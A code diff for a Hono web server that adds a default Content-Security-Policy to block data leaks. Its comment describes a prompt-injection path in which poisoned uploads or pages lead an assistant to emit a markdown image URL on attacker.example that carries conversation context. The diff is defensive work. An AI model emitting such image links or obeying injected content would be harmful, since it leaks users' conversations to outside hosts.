@@ -37,10 +37,49 @@ import { IMAGE_API, IMAGE_STEPS, IMAGE_STORAGE_DIR } from './lib/image-store.ts'
 const app = new Hono<AppEnv>()
 
 app.use('*', logger())
-// No CSP here: the client renders KaTeX, syntax highlighting and a service worker, and an
-// untested policy breaks the page silently. A ready-to-enable policy is in the README's
-// nginx section instead. HSTS is left to the proxy that terminates TLS.
+// HSTS is left to the proxy that terminates TLS.
 app.use('*', secureHeaders({ xFrameOptions: 'DENY', referrerPolicy: 'strict-origin-when-cross-origin', strictTransportSecurity: false }))
+
+/** The directive that matters is `img-src`.
+ *
+ *  An assistant answer containing `![](https://attacker.example/?d=<context>)` is rendered as a
+ *  plain `<img src>` by the markdown renderer, so the browser fetches it the moment the answer
+ *  appears: no tool call, nothing in the progress log, and `url-guard.ts` never involved — that
+ *  guard is server-side and blocks the *inward* direction (SSRF). Restricting images to our own
+ *  origin is the only thing that closes it, and a model can be talked into emitting such an image
+ *  by content it reads (a poisoned upload or web page), not only by being maliciously trained.
+ *
+ *  Applied by the app rather than left to a reverse proxy so it also covers direct-port
+ *  deployments, and so it can be regression-tested. Verified against the built client: the service
+ *  worker registers from an external /registerSW.js (no inline script), KaTeX and
+ *  react-syntax-highlighter need inline *styles* only, and nothing loads from a third-party origin.
+ *  `unsafe-inline` for styles does not reopen the hole — CSS `url()` image loads are governed by
+ *  img-src and @font-face by font-src. Dev is unaffected: Vite serves the page there. */
+const DEFAULT_CSP = [
+  "default-src 'self'",
+  "script-src 'self'",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data: blob:",
+  "font-src 'self' data:",
+  "connect-src 'self'",
+  "worker-src 'self'",
+  "object-src 'none'",
+  "base-uri 'self'",
+  "form-action 'self'",
+  "frame-ancestors 'none'",
+].join('; ')
+
+// Full replacement for deployments that legitimately load remote assets. Empty string disables.
+const CSP = process.env.CONTENT_SECURITY_POLICY ?? DEFAULT_CSP
+if (!CSP) {
+  console.warn('[csp] Content-Security-Policy disabled — an answer containing a remote markdown image can silently send conversation content to that host.')
+} else {
+  // Set after next(), matching secureHeaders above: the response object exists by then.
+  app.use('*', async (c, next) => {
+    await next()
+    c.res.headers.set('Content-Security-Policy', CSP)
+  })
+}
 
 // The client is always same-origin (Hono serves it in production, Vite proxies /api in dev),
 // so CORS is off unless a cross-origin caller is explicitly configured.
